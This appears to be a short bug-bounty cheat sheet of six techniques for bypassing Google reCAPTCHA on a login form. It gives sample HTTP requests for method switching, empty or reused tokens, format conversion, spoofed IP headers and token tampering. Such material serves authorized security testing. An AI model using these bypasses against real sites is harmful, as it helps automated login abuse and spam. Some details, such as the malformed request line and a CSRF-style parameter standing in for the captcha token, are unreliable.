# Bypass Captcha (Google reCAPTCHA)

1. Try changing the request method, for example POST to GET
```
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```

Change the method to GET
```
GET /?_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123 HTTP 1.1
Host: target.com
...
```

2. Try remove the value of the captcha parameter
```
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=&_Username=daffa&_Password=test123
```

3. Try reuse old captcha token
```
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=OLD_CAPTCHA_TOKEN&_Username=daffa&_Password=test123
```

4. Convert JSON data to normal request parameter
```
POST / HTTP 1.1
Host: target.com
...

{"_RequestVerificationToken":"xxxxxxxxxxxxxx","_Username":"daffa","_Password":"test123"}
```
Convert to normal request
```
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```

5. Try custom header to bypass captcha
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

6. Change some specific characters of the captcha parameter and see if it is possible to bypass the restriction.
```
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```
Try this to bypass
```
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=xxxdxxxaxxcxxx&_Username=daffa&_Password=test123
```
